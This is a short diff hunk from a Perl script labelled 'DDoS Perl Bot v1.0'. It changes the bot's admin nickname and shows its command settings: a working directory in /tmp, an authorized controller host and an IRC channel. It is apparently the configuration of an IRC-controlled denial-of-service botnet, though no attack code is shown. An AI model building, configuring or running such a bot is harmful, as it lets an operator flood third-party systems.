@@ -142,7 +142,7 @@ my $sleep='5';
 my $homedir = "/tmp";
 my $version = 'DDoS Perl Bot v1.0';
  
-my @admins = ("moe");
+my @admins = ("moey");
 my @hostauth = ("lilmoe.store");
 my @channels = ("#dew");
  
